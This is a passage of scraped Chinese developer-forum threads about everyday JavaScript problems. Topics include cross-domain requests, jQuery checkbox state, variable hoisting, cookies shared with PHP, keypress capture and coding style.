我给你们说\r", "\r", "楼主的意思是 服务器判断了，非法请求返回302，所以返回302在这个情况下是非法的\r", "\r", "楼下的意思是 302状态码原来是代表非法？ \r", "\r", "楼主也请你说明白，跨域有两种情况，一种是去请求自己的资源，自己有服务器掌控权，两边都有。这种情况解决方法蛮多的，比如用flash中转，比如上面说的在包头加个参数。\r", "\r", "一种是拿别人的数据，别人要求你按指定的方式可以拿到数据，对方也可能只让自己的网站拿数据，非自己网站，直接不给你数据。而你却想要它的数据……就一般而言，这个方法也蛮多的，你如果有搜索的话，一定会知道的，那就是拿自己服务器来中转请求。\r", "\r", "浏览器对跨域问题还是很严肃的，因为不严肃的话会涉及到安全问题，所以不管是哪一年，都会有无数人抛出这个问题……“如何通过js获取对方网站数据”“如何跨域”等等。\r", "\r", "好了，我给你们排解了误会，也解答了你的问题。给分吧", " jsonp只能get", "设置a站的域为xx.com", "设置a站的域为xx.com\r", "设置b站的域为xx.com\r", "完美解决", "JSONP 是一个不太好的解决方案，设置 Access-Control-Allow-Origin 才对。", " \r", "Access-Control-Allow-Origin不支持ie8及以下版本", " 抱歉，IE10-", " \r", " \r", " \r", " \r", " \r", " \r", "我没理解清楚，返回了302，就是说跨域请求成功了吗，只是请求被判断为非法请求，没有返回期望的数据而是直接跳转了。能不能这么理解？\r", "\r", "另外，a.xx.com请求b.xx.com是不是有跨域问题？", "我现在已经解决了这个问题，方法是把b.xx.com的请求代码复制到了a.xx.com，不然要改很多js代码", " 是跨域，但满足下面任意一条时就可以请求\r", "1. ", " 和 ", " 均降域\r", "2. 使用了 CORS 协议"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>环境:Firefox 31.3.0 (Linux/Windows)</p>\n\n<p>通过按钮是否被选中控制另一个组件是否显示，以下代码不work，可能是什么原因呢？<br>\n调试发现，无论check或者uncheck按钮，<code>$('#op-checkbox').checked</code>总是为假。</p>\n<div class=\"highlight\"><pre>$('#op-checkbox').click(function(){\n  if( $('#op-checkbox').checked ){\n    alable.show();\n   } else{\n    alable.hide();\n   }\n});\n</pre></div>\n</div></div>", "<div class=\"topic_content\">jquery-1.11.1</div>", "<div class=\"topic_content\">本人又二逼一回，感谢大家帮助！已经找到原因了。非常感谢各位朋友的！</div>"], "reply": "26", "tittle": "js 检测 checkbox 状态时遇到的“诡异”问题", "comment": ["jquery的经典问题啊。你那个checked都不是标准属性。\r", "jquery判断checked的三种方法:\r", "\r", ".attr('checked'):   //看版本1.6+返回:\"checked\"或\"undefined\" ;1.5-返回:true或false\r", ".prop('checked'): //16+:true/false\r", ".is(':checked'):    //所有版本:true/false//别忘记冒号哦\r", "\r", "另外，如果\r", "<input type='checkbox' checked>\r", "<input type='checkbox' checked=\"checked\">\r", "这样两个checkbox，用attr 得到的返回值好像还不一样。具体怎么不一样忘记了。", "jquery对象$(xxx)是不包含原生js的element方法和属性的。\r", "不过你可以使用下面的几个方法做到类似的判断。\r", "if ( $(elem)[0].checked )\r", "if ( elem.checked )\r", "if ( $(elem).prop(\"checked\") )\r", "if ( $(elem).is(\":checked\") )", "感觉随着浏览器标准统一jQuery会用的越来越少了。", "用$.prop，读取和设置都是，否则会有兼容问题。", "prop 是运行状态，attr 是标签属性。checked 是什么东西？", " @", "  谢谢，两位说的方法还是不work呀，好奇怪。\r", "\r", ".attr('checked') 和 .prop('checked') 还有if ( $(elem)[0].checked ) 无论选中或者不选中，都返回 \"undefined\"\r", ".is(':checked') 永远返回false.\r", "\r", "哪里姿势不对。。。快疯了。。。", "$('#op-checkbox:checked').length", " 把你的代码贴出来吧。\r", "需要两部分。\r", "1.所有引用的js文件名\r", "2.你的checkbox 的html代码", "Solution 1:\r", "\r", "$('#op-checkbox')[0].checked", "jQuery是什么版本的？1.7.1的话 is(':checked') 应该没问题的呀。", " 谢谢，是1.11.1版本的。\r", "\r", "\r", " 额，还是不行。。。\r", "\r", "  简化整合到1个html文件了，我这里无论怎么点击，都是\"undefined\"，无法区分选中和未选中。。。求帮忙看看，谢谢啦。\r", "\r", "<html>\r", "\r", "<head>\r", "<script type=\"text/javascript\" src=\"http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.11.1.js\"></script>\r", "<script>\r", "$(document).ready(function(){\r", "    $('#op-checkbox').change(function(){\r", "            if( $('#op-checkbox').attr('checked') ){\r", "                alert(\"hi, checked\");\r", "            } else{\r", "                alert(\"hello, unchecked\");\r", "            }\r", "    });\r", "});\r", "</script>\r", "</head>\r", "\r", "<body>\r", "<label id=\"op-checkbox\"><input type=\"checkbox\">op</label>\r", "</body>\r", "\r", "</html>", "用 @", " 的方法就可以\r", "checked是dom对象的属性，所以用 $('#op-checkbox')[0] 找到dom对象就行了。", " 额，上面的贴的有点问题，判断是否checked的是这一句：\r", "if( $('#op-checkbox').attr('checked') === \"undefined\" )\r", "\r", "\r", "\r", " 额，好吧，我研究研究，谢谢。", "-.-||\r", "这个\r", "$('#op-checkbox').attr('checked')   \r", "改成\r", "$('#op-checkbox input').prop('checked')", " 好像真不行，无论怎样都选中或者未选中，都是\"undefined\" :( thx.", "这是什么写法，为什么要把input用label包起来。。\r", "你这样用$('#op-checkbox')拿到的是label。。。。", "你这都在label上，当然没有checked了，取下面的input啊。", "幸好让你把代码贴出来了。\r", "你一直在判断的都是lable的属性。当然没有checked的属性了。\r", "你给checkbox一个ID，或者像@", " 写的那样，应该就没有问题了。", " @", "   我脑残了，copy来的代码然后改的。谢谢。", "取到的是label，又不是checkbox。当然永远是undefined了", " 是不是页面里多个 $('#op-checkbox')\r", "你可以这样写：\r", "$('#op-checkbox').click(function(){\r", "  if( this.checked ){\r", "    alable.show();\r", "   } else{\r", "    alable.hide();\r", "   }\r", "});", " 抱歉，可以用label把input包住~~", "你在逗我? <label id=\"op-checkbox\">\r", " $('#op-checkbox') 连 input 都没选到.", " 额，是有多个checkbox，分别对应多个“块”，每个checkbox负责一个“块”的显示。", "if($(\"input:checkbox:checked\").val()){\r", "  ###\r", "}\r", "这样应该可以的！", "disabled\r", "readonly\r", "autofocus\r", "checked\r", "这种属性级的用prop，\r", "如果是自定义属性，用attr.\r", "数据型的用data"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>TIOBE 2015年2月编程语言排行榜 JavaScript排名达到历史最高</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.cnbeta.com/articles/369135.htm\">http://www.cnbeta.com/articles/369135.htm</a></p>\n</div></div>"], "reply": "69", "tittle": "哇咔咔 javascript 变高大上了 超越 php python", "comment": ["呵呵。PHP才是最好的语言。", "写python的一定会写javascript\r", "\r", "会javascript的不一定会python。就这么简单。", " 都是会写 if else 而已。高级的没那么好学，你这样会引战的", "正文第二段，以及Baidu等，，这", " 一定，哈哈。你怎么得出来的", "写php的和拿python写web的都替这一份超越添砖加瓦了.", " +1 要是有前端 python 编程，一定不会用 javascript 的", "vb 居然爬这么高了#35.", "以为最近米国监狱开设的编程课程就是javascript呀", "没有最好，只有最适合，在牛B的语言再某些应用场景和业务需求下也还能跪拜~", "Ruby 人越来越少了。。。", "语言之争是一条不归路，坛友共勉：）", " 多转nodejs了", " \r", " \r", " \r", "意思是 python 是后端语言 写完后端写前端不得不用js\r", "但是 js 是前端必备  写完前端可以继续用 js (如node.js) 写后端", " \r", "偶是\r", "\r", "1.桌面 qml／js\r", "2.2d游戏 cocos2dxjsb\r", "3.3d unityscript\r", "4.后台 nodejs\r", "5.前段 js\r", "\r", "看不出哪个还能这样做", "看人不看语言。\r", "\r", "先举反例：例如一个前端小伙，只会写点 jQuery 特效，让他当你面写代码还会有语法错误。然后某天看了下 express 折腾跑起来了 nodejs，说他可以写网站呢。\r", "\r", "前端和后端有相应不同的知识体系。语言排名再高也不及自己对语言自身掌握的透彻。", "PHP7要出来了 准备吓尿吧", "哈哈，javascript再嚣张也翻不了天，不就是弹弹弹", "javascript is just a joke.\r", "\r", "tell the value of each expression, do not use your console\r", "[] == []\r", "[] < []\r", "[] > []\r", "[] <= []\r", "[] >= []\r", "\r", "[] + []\r", "{} + {}\r", "[] + {}\r", "{} + []\r", "\r", "Math.min() < Math.max()", " \r", "\r", "我来补充\r", "数据库: MongoDB\r", "Windows: Office 15\r", "Mac OS: Automator", " 你说的这个可不一定啊。\r", "或者只能用Python的思路写些简单的JavaScript，然后闭包、原型、跨域之类的就不甚了解。\r", "更常见的情况是会Python的只会Python。\r", "\r", " 至于你这种运算，实际中就算是菜鸟也不会写，因为实际中根本应用不到。这跟菜鸟不了解弱类型的隐式转换而写出字符串与整数相加的错误不一样，那个你可以用来批评一下JS不如Python对菜鸟的照顾周到。", " 那就只能耍流氓谈谈 javascript 的作用域以及回调地狱了= =", "写后端的很多都写javascript吧，讨论这些没什么意义，还是讨论下具体的应用场景的选择以及遇到的问题吧", " @", " \r", "\r", "> 闭包、原型、跨域之类的就不甚了解\r", "\r", "问题的关键是：TIOBE统计的js流行程度是不是必须了解 闭包、原型、跨域和其他高级用法才算js？\r", "\r", "我的结论不是引战啊，这里没啥战的。只要做web，无论你用什么语言，基本都会js的。js流行是必然。", "还不是html5推的？", "浏览器语言本来就是垄断的嘛", " 今天正好看到这个东西，但是我还不了解具体运行原理，请问哪里可以看到啊？", " 于是问题来了，你是 @ 哪楼的我= =？\r", "jokes\r", "\r", "\r", "Google javascript scope\r", "\r", "Google javascript callback hell\r", " +1", " 就是要这个，谢谢啦", "PHP是最好的语言～", "golang粉冷笑不语", "我也笑而不语~", "呵呵。PHP才是最好的语言。", " 写PHP一定会写js才对", " \r", "\r", "不是美国总统推的么？http://mashable.com/2014/12/09/president-obama-code/", "twood's Law\r", "Any application that can be written in JavaScript, will eventually be written in JavaScript.\r", "但是这个过程会比较漫长……", "大多数后端开发者都会一些js，但能用好的应该不多；随着html5跟nodejs的发展，用js的人会越来越多，排名可能还会涨呢", " 微软 hadoop 就是javascript搞定算法\r", "\r", "谁能用python试一下 哈哈", "最近在玩响马的fibjs，嘿嘿", "c/c++的表示路过", "Nodejs这块确实贡献了不少活跃度", "卧槽，C排第一什么意思，搬砖的春天来了", "现在经常写js，用浏览器debug 真恶心。", " c 有的时候不得不用啊，我现在用 nodejs 开发，某些要求高性能的东西还是要调用 c 的", "\r", "一张图给 JavaScript 打回原形。", "问题是php coder大多写不过wordpress drupal", "呵呵，js才是最好的语言。", " 回调地狱现在你可以用promise来处理，可以写出非常优雅的代码。而且回调也是js的优势，最高效得使用cpu", "中文才是世界上最好的语言", "很多Ruby的逐渐转Rust、Go啥的了\r", "话说回来最近discourse还挺火的", "各位mongodb hadoop\r", "的mapreduce都用javascript\r", "楼上哪位php python专家写个php python引擎", " 你这就没意思了，MongoDB 只是给了一个 connector\r", "Python 这边的 hadoop connector 不要更多\r", "另外，你听说过 PySpark 么？", " python太慢 google都放弃了 别留恋了", " ", " 骚年入行没多久吧，c第一，java，c++争老二已经10好几年了。*nix、windows底层都是c写的，除非现有操作系统架构崩溃否则c永远都是第一。", "流行度跟高大上有个半毛钱关系啊？你就算全世界最多人用。。超过C又能如何，呵呵", "其实我想吐槽为什么Pascal排名突然变得那么高", " abb机器人都是类pascal脚本 哈哈", "VB 。。。。。", "我会js，也了解python，现在在做js的工作，但我觉得py对初学者更友好。", "vb都进前十了，是要进入全民编程时代了么", "会写和熟练掌握是两码事，语言没有最好，只有更合适和更熟悉，再说，语言都是相通的嘛，只是应用场景不同，会有不同的特性。", "HTML5 + node.js 功不可没啊，在很多大公司广泛使用，不猛增不行啊~\r", "\r", "都别吵吵了，TIOBE index is \"not about the best programming language or the language in which most lines of code have been written\". ", " ios测试脚本都是javascript 微软hadoop云的mapreduce算法也是javascript\r", "哈哈", "typescript发来贺电", " tiboe算是热度排行 用的人多查询的人多排位靠前", "这么黑有意思吗？\r", "\r", "php 不是 general purpose 的语言，没有可比性。\r", "\r", "python 在 web 领域被各大语言挤压，科学计算和图形又非常非常小众。\r", "\r", "js 的前端后端 pc 移动还有 unity ，哪个不火吧。"]},
{"content": ["<div class=\"topic_content\">访问 MCBBS 后反复自动刷新页面，源码只有这一行。<br><br>&lt;script type='text/javascript'&gt;document.cookie='shieldval=defendShield- (IP地址);path=/';if (window.location.href.match(/defendShield/)){window.location.replace('/');}else{window.location.reload();}&lt;/script&gt;<br><br>IP 地址就是本机的外网地址，用了代理就是代理 IP，HTTP 代理和 SS 都试过了，问题照旧。PC、iPad 出现同样问题。<br><br>现在完全搞不懂哪一层出了问题，按理说用了 SS 就不可能是 ISP 劫持，换设备登陆就排除了浏览器问题……</div>"], "reply": "4", "tittle": "奇怪的 JavaScript", "comment": ["添加一个cookie\r", "\r", "然后判断你访问的地址有没有含一个关键词“defendShield” （这里代码写的很怪）\r", "\r", "判断成立，跳转到根地址\r", "\r", "不成立，就地刷新", " 请问具体如何操作？", " \r", "\r", "\r", "\r", "应该是MCBBS服务出了点问题\r", "\r", "（手滑点了感谢。。。。。。", " 感谢x2，谢谢啦！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>rt</p>\n\n<p><code>Sublime Text-JSCS Formatter 插件调用的时候无法添加参数</code></p>\n</div></div>"], "reply": "3", "tittle": "JSCS 如何设置一个默认的 preset? 不是自己添加 jscsrc!", "comment": ["不知道我是否有误解你的问题，本来可以用--preset 或者 --config 来设置，但是如果是因为插件不能带参数的话，你可以如下设置jscsrc，比如你想用airbnb的话：\r", "{\r", "  \"preset\": \"airbnb\",\r", "}", " \r", "\r", "目前两个问题:\r", "\r", "1. jscsrc 文件需要自己给每个项目创建吗? (我看首页的教程, 好像是不需要的.)\r", "\r", "2.我手动创建 jscsrc 文件后, 终端是能使用了. 但是 Sublime Text 使用 JSCS Formatter 插件后, 不生效.(没有 jscsrc 文件之前, 提示没有 jscsrc 文件.)", "1. 建议每个项目分别设置jscsrc并加入到代码repo，毕竟每个项目的配置要求可能不一样。\r", "2. 你用的是https://github.com/TheSavior/SublimeJSCSFormatter？我一直用vim没有用过sublime，如果你还是试不出来的话扔个issue上去呗。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，没试过，感觉理论上可以，谁讲一下这个问题</p>\n</div></div>"], "reply": "7", "tittle": "js 设置的 cookie php 可以读吧？反过来亦然", "comment": ["试一下都出来了，可以。。", "问题不在于能否互相访问，而是理解其中原理。php是运行在服务器端的，他的唯一作用就是接受http请求，执行php脚本，生成html页面，回复给浏览器。浏览器收到了服务器发来的html页面之后会呈现出来，同时也会执行js脚本。\r", "\r", "那么cookies是怎么同步的？浏览器内每一个域名都会保存一些cookies，值是由你设定的，js可以对浏览器内的cookies读写访问。但是呢，每一次浏览器访问服务器的时候，php都会接收到一个http请求，这个请求内会包含浏览器内存储的cookies，所以说php在生成html页面的时候，也可以取得用户这边的cookies。在php生成html页面的时候，同时会生成一段http响应，响应中就包含了一个叫Set-cookie的属性，浏览器收到这个响应就会去修改内部的cookies。\r", "\r", "所以说本身cookies是只存在于浏览器的一段文本，可以由js访问。只有在发生http请求的时候，这段cookies才会传递给服务器，伺候服务器也可以返回Set-cookie来修改浏览器的cookies。这不能叫做互相读取，而是一种传递机制。", "服务器端可以设置httponly的cookie，js不能访问", "错错错！！！！\r", "\r", "至少不完全正确，Cookie有一个属性叫httponly，说简单点就是不是服务器专用。JS想读取到！做梦！在IE6上面都是做梦！读都读不到，还想操（作），就是做梦！\r", "\r", "比如常见的维持session会话用的cookie phpsessionid，aspsessionid。\r", "\r", "所以很多讲XSS偷cookie的，都喜欢说可以偷走这个会话id，其实是偷不走的。除非程序员傻了，直接用cookie验证而不是用sessionid，用cookie也就算了，竟然不打httponly标记！", " cookie有httponly属性的读取不了。通常服务器用来维持session会话的sessionid就是httponly的，那些说漏洞的老是喜欢说XSS漏洞可以偷走这个sessionid，其实是偷不走的\r", "\r", " @", " 一看就是和我一样的RSS用户，回复时间几乎一致，而我是打字慢花掉了时间", "顺便说明下，对此怀疑又想测试又怕麻烦的，请移步google首页，从隐私模式打开，看开发者工具，可以很明显的看到有2个cookie，一个就打了httponly标记，所以js只能读取到其中一个，不能读另一个，顺便送上读取全部cookie的js代码\r", "document.cookie", " 学习，谢谢。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这两天在研究按键的捕获，实用的场景是这样的：</p>\n\n<p>某格斗游戏，有一个招式是 ↓↘→D 现在需要打出这个斜的按键。我用的是wasd来模拟的方向键。</p>\n\n<p>于是先考虑记录两次按键的间隔，如果按下s和d的间隔足够小，就认为是一个斜向按键，于是这个招式只按了s和d两次，就发出三个方向。</p>\n\n<p>然后后面又有一个招式是 ↘D ……</p>\n\n<p>所以问题来自于记录不了同时按键的时候按下的状态，只能捕捉到按下的动作。有什么方法可以解决这个问题么？</p>\n\n<p>PS： 这个游戏是拳皇……</p>\n</div></div>"], "reply": "5", "tittle": "js 有没有办法捕获同时按下的两个按键？", "comment": ["也许你需要的是这个 ", "克拉克的指令投", "把按键状态缓存下来，类似这样：\r", "\r", "```javascript\r", "var pressingStatus = {};\r", "\r", "elem.onkeydown = function (e) {\r", "    pressingStatus[e.keyCode] = true;\r", "\r", "    if (pressingStatus[keyA] && pressingStatus[keyB] && ...) {\r", "        // do something\r", "    }\r", "};\r", "\r", "elem.onkeyup = function (e) {\r", "    pressingStatus[e.keyCode] = false;\r", "}\r", "```", " \r", " 你发的那个konami.js 的思路就是三楼的思路，我觉得不错，晚上回来试试", "可以借用underscore的debounce方法实现，做成某个延时内响应的按键都推迟该延时回调方法的调用，而这个回调方法的作用就是清除3楼提到的pressingStatus，这样避免按着不动然后再同时松开，也能简单的触发连招。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天遇到一个奇怪的问题，为了使问题描述简单，我就这样说吧。比如页面上几个文本框，首先是隐藏的，但是文本框是有值的，然后有个复选框，默认是勾选的，如果鼠标点击复选框取消勾选，这个时候隐藏的文本框都显示出来，这个时候我改变文本框的值，进行提交（注意是ajax提交）表单，但是经过firefox js跟踪，发现传的值不是你改动后的值，而是文本框原先就有的值，我要如何让它传改动后的值呢？</p>\n</div></div>"], "reply": "9", "tittle": "ajax 表单传值问题", "comment": ["同步异步的问题？", " 这是同步异步的问题？能不能详细讲讲", "文本框改动后ajax提交前没有重新获取文本框的值吧, 所以ajax表单还是绑定之前的值", " 问题就是如何更新这个值", " 既然你是ajax提交的表单那当然是用js更新了", "請出示代碼", " 抱歉很久没接触js了，不过印象中依稀记得在这个地方被坑过。", "你先搞清楚attr和prop的区别。", "原因在于点击提交按钮有个click，重新给文本框赋值了。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在学习 JavaScript 然后刚好碰到这个神奇的问题，百思不得其解：</p>\n\n<p>var a = 1;</p>\n\n<p>function foo() {<br>\n    if (!a) {<br>\n        var a = 2;<br>\n    }<br>\n    alert(a);<br>\n};</p>\n\n<p>foo();</p>\n\n<p>结果：2</p>\n\n<p>上面的 function foo() 中的 alert 弹出了 2 ，应该是说明了 if 里的 var a 被提升了。但是提升不是只提升 变量的声明 吗？想问为什么 a 被成功赋值为 2 了？(ಠ .̫.̫ ಠ)</p>\n\n<p>然后我尝试把 if 的条件改为了 false 后：</p>\n\n<p>var a = 1;</p>\n\n<p>function foo() {<br>\n    if (false) {<br>\n        var a = 2;<br>\n    }<br>\n    alert(a);<br>\n};</p>\n\n<p>foo();</p>\n\n<p>结果：undefined</p>\n\n<p>说好的提升呢？(☍﹏⁰) 不提升好歹也弹出全局变量的 1 把？为什么是 undefined？？？？(♩￢3￢)</p>\n\n<p>真心求指教，被这个提升搞到头都大了。</p>\n</div></div>", "<div class=\"topic_content\">感谢各位的回答！！！！现在整个人豁然开朗了。<br>那我就以我已经了解的来解释一下我自己所提问的问题吧。<br><br>源代码：<br>var a = 1;<br><br>function foo() {<br>if (!a) {<br>var a = 2;<br>}<br>alert(a);<br>};<br><br>foo();<br><br>解释器解释后：<br>function foo() {<br>var a;<br>if (!a) {<br>a = 2;<br>}<br>alert(a);<br>};<br><br>var a = 1;<br><br>foo();<br><br>解释器解释后详解：<br>1、 [函数声明优于变量声明，所以被提升与 var a = 1; 上面] <br>function foo() {<br>2、 [因为函数里的 if 里有 var = a 变量声明，故被提升至函数作用域的顶部] <br>var a;<br>3、 [此时被提升的 var a 相当于 var a = void(); 所以 a = false 则 !a = true] <br>if (!a) {<br>4、 [所以 a =2 就被成功的赋值了] <br>a = 2;<br>}<br>alert(a);<br>};<br><br>var a = 1;<br><br>foo();</div>", "<div class=\"topic_content\">1、 [函数声明优于变量声明，所以被提升与 var a = 1; 上面]  -&gt; 1、 [函数声明优于变量声明，所以被提升至全局 var a = 1; 上面]</div>", "<div class=\"topic_content\">3、 [此时被提升的 var a 相当于 var a = void(); 所以 a = false 则 !a = true]  -&gt; 3、 [此时被提升的 var a 相当于 var a = void 0; 所以 a = false 则 !a = true]</div>"], "reply": "12", "tittle": "JavaScript Hoisting 的问题", "comment": ["第一段代码相当于：\r", "var a = 1;\r", "\r", "function foo() {\r", "  var a;\r", "  if (!a) {\r", "    a = 2;\r", "  }\r", "  alert(a);\r", "};\r", "\r", "foo();\r", "\r", "更进一步：\r", "\r", "var a = 1;\r", "\r", "function foo() {\r", "  var a = void 0;\r", "  if (!a) {\r", "    a = 2;\r", "  }\r", "  alert(a);\r", "};\r", "\r", "foo();", " 感谢回答！！！！\r", "我知道 if 里的 var a 会被提升。但是为什么 a = 2 也被成功的执行了呢？", "if 是不会被提升的吧！第一个之所以输出2是因为\r", "函数被提到最上面了，那时候 a 还没定义，所以 if(!a)为真，执行了 a =2。我是这么想的。", "因为 if (!a) 这个条件是真值（a 的值是 void 0，因此 a 是假值，!a是真值），所以会执行 a = 2。", "好像不太对。", " 的回答是正解。", "`function` 先于 `var a = 1` 被解析哟。前者内部在解析的时候，a = window.a = undefined, 后者是个干扰，额呵呵~\r", "想更加深入地了解，请看： ", "\r", "\r", "话说这个系列写于两年前一直是 part I，这两天一定要逼自己更新了啊啊啊！", " 感谢，但是按照你这么说，解释器解释后是这样\r", "\r", "function foo() {\r", "if (!a) {\r", "var a = 2;\r", "}\r", "alert(a);\r", "};\r", "\r", "var a = 1;\r", "\r", "foo();\r", "\r", "全局的 var a = 1; 应该还是会被 声明 并 定义。\r", "看了下 4 楼的回答后感觉整个人豁然开朗了。。", " 感谢！！！！", " 对的，我理解错了， luin 那个是正解。", " 嗯，原来我是被 if 里的 var a 提升坑了。原来提升后 var a = void (); 然后 void(); 代表的是 f alse (ಠ .̫.̫ ಠ)", "JS中函数和变量的声明会被提前执行"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Material Design swipe to refresh js版本，不影响页面布局结构，<br>\n基于CSS3动画实现，高性能，适用于移动web上使用。<br>\n总3种实现效果，使用方法简单。</p>\n\n<p>详细说明介绍参见：<br>\nGithub: <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/lightningtgc/material-refresh\">https://github.com/lightningtgc/material-refresh</a></p>\n\n<p>演示DEMO： <a target=\"_blank\" rel=\"nofollow\" href=\"http://lightningtgc.github.io/material-refresh/\">http://lightningtgc.github.io/material-refresh/</a></p>\n</div></div>"], "reply": "12", "tittle": "Material Design 下拉刷新组件,基于 CSS3 与 JavaScript 实现，高性能，适用于移动 web 开发。", "comment": ["在我的ios8 ip6上是卡的…原因在于箭头在慢慢下拉的时候旋转太生硬，缺帧或者是缺残影…", " \r", "不知道是不是我的手机配置垃圾，MX3.\r", "能感觉到明显掉帧卡顿，发热瞬间提供了很多，CPU也突破 600Mhz 的低频水平了。\r", "不过看起来貌似挺实用的效果，有点想用了！", "喜欢这种小而美的css库", "react-canvs 才是未来", "下拉时目测只有 5fps，很遗憾。", " 波浪线怎么回事?", " 波浪线怎么回事?\r", "那个不是波浪线，是柱形图。如果柱子在绿色横线上放，就说明了 CPU 和 GPU 处于高负载状态，并且运作不过来，导致卡帧掉帧现象。\r", "你可以看到，那时 cpu 54度，电流和电压是平时的4～5倍多，GPU 频率也是平时 5 倍。", " 原机的测试工具吗？", "好看 不是非常流畅", " 原机的测试工具吗？\r", "对，mX3 flYMe3.8.5 anDroiD ruN tiME moDe, anDroiD 4.4.4", "下拉的效果有点糟糕，其他挺棒的，很好看。"]},
{"content": ["<div class=\"topic_content\">客人有一个旧的 Diy T-shirt 系统，是基于flash开发,无论功能，还是设计都跟不上时代的发展，现在需要重新开发，要求基于html 5 ，电脑、平板、手机都可以用。由于之前一直在做cms、crud之类的web开发，也只是用过bootstrap作为UI框架，对于html 5 的应用没有涉及过，大该知道的概念是：html 5、SPA、Canve、前端MV*框架、响应式，但对于技术选型有困惑，还要跨设备，考虑性能，现在不知从何入手。<br>也 google了一下，只找到一个开源案例， <a target=\"_blank\" href=\"https://github.com/imomin/CustomTShirt\" rel=\"nofollow\">https://github.com/imomin/CustomTShirt</a>  但太简单了<br>也找过一些商业例子，例如：<br><a target=\"_blank\" href=\"http://www.spreadshirt.com/design-your-own-t-shirt-C59\" rel=\"nofollow\">http://www.spreadshirt.com/design-your-own-t-shirt-C59</a> <br> <a target=\"_blank\" href=\"http://inkxe.com/magento/product-designer\" rel=\"nofollow\">http://inkxe.com/magento/product-designer</a> <br> <a target=\"_blank\" href=\"http://inkyrobo.com/jQueryTshirtTool/LivePreview/\" rel=\"nofollow\">http://inkyrobo.com/jQueryTshirtTool/LivePreview/</a> <br>但或多或少不符合客人需求，无法直接购买源码，就算购入源码，也怕二次开发会跌入坑。<br>求大神们有什么好的建议，或者思路？</div>"], "reply": "7", "tittle": "准备要开发一个 Diy T-shirt 的 html 5 web app ，求技术选型思路", "comment": ["有多大的肚子, 吃多大的饭.", "还不错哦 以前帮别人做过一个类似的 不过都是合成的png图片 就是一套3d模型几十张图 做的是衬衣 衬衣可以换扣子换领子 换布料 十几块 \r", "\r", "最后那个项目那帮做后端的人太坑 就没继续了 \r", "\r", "这几个例子比我当时搞的棒多了，感觉这个东西主要还是交互吧，设计的还是约简单越好，想象一下diy一个东西要点上百下也是醉了。\r", "\r", "界面的话可以桌面平板搞一个 手机还是专门重新设计一下比较好", " 无办法啦，这个客人都是很多年的关作的，他也很信任我们公司，所以才给我们做。而且，我也想基于这次的项目，学习更多东西，自我增值，之前苦于没有类似的项目来学习，现在有机会，要好好把握", " 对啊，交互这方面是我的弱点", "之前我也了解过类似的功能，可以了解下基于 Fabric.js 的 HTML5 canvas 实现方案", "这方面我觉得做的最好的应该是耐克的官网吧，上面有个\"NIKEID专属定制\"栏目，你可以看看，但怎么做的我也不知道，哈哈", "求做完开源。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"c1\">// 没空格</span>\n<span class=\"k\">if</span><span class=\"p\">(){</span>\n<span class=\"c1\">// 遇到花括号空1格</span>\n<span class=\"k\">if</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n<span class=\"c1\">// if 直接空1格</span>\n<span class=\"k\">if</span> <span class=\"p\">(){</span>\n<span class=\"c1\">// 都空1格</span>\n<span class=\"k\">if</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n<span class=\"c1\">// 条件空1格，花括号换行</span>\n<span class=\"k\">if</span> <span class=\"p\">()</span>\n<span class=\"p\">{</span>\n\n<span class=\"c1\">// 以上同样的问题也空在于 function 和 obj 上面</span>\n<span class=\"c1\">// 方法</span>\n<span class=\"kd\">function</span><span class=\"p\">(){</span>\n<span class=\"kd\">function</span> <span class=\"p\">(){</span>\n<span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n<span class=\"kd\">function</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n\n<span class=\"c1\">// 对象</span>\n<span class=\"kd\">var</span> <span class=\"nx\">obj</span><span class=\"p\">{</span>\n<span class=\"kd\">var</span> <span class=\"nx\">obj</span> <span class=\"p\">{</span>\n<span class=\"kd\">var</span> <span class=\"nx\">obj</span>\n<span class=\"p\">{</span>\n</pre></div>\n</div></div>"], "reply": "5", "tittle": "关于 javascript 的编程风格", "comment": ["萝卜白菜，各有所爱。\r", "你看着舒服，说不定别人看到就觉得你很奇葩。。", "要引发大战了。顺便不写分号，前置逗号也拉进来讲。", "1. 缩进空格问题，像 tbs 这种流行框架什么的推荐是 2 格，但是看到多数人用 4 格。\r", "   那么现在问题来了，到底是空2格还是4格。。。\r", "   \r", "2. 括号和花括号\r", "```javascript\r", "// 没空格\r", "if(){\r", "// 遇到花括号空1格\r", "if() {\r", "// if 直接空1格\r", "if (){\r", "// 都空1格\r", "if () {\r", "// 条件空1格，花括号换行\r", "if ()\r", "{\r", "\r", "// 以上同样的问题也空在于 function 和 obj 上面\r", "// 方法\r", "function(){\r", "function (){\r", "function() {\r", "function()\r", "{\r", "\r", "// 对象\r", "var obj{\r", "var obj {\r", "var obj\r", "{\r", "```\r", "\r", "换行问题有大神说过Javascript会自动添加句末的分号，导致一些难以察觉的错误，\r", "但是我觉得就算花括号不换行，但是在实际在文件中换行的地方多了去了，所以这个自动添加句末的分号的问题不应该成为一个编程风格的理由。\r", "\r", "按常见风格\r", "```javascript\r", "define([\"../jquery\",], function( jQuery ) {\r", "\r", "    var rclass = /[\\t\\r\\n\\f]/g;\r", "\r", "    jQuery.fn.extend({\r", "\r", "        addSomeClass: function( value ) {\r", "\r", "            if ( proceed ) {\r", "                classes = ( value || \"\" ).match( rnotwhite ) || [];\r", "\r", "                for ( ; i < len; i++ ) {\r", "                    elem = this[ i ];\r", "                    cur = elem.nodeType === 1 && ( elem.className ?\r", "                        ( \" \" + elem.className + \" \" ).replace( rclass, \" \" ) :\r", "                        \" \"\r", "                    );\r", "\r", "                    if ( cur ) {\r", "                        j = 0;\r", "                        while ( (clazz = classes[j++]) ) 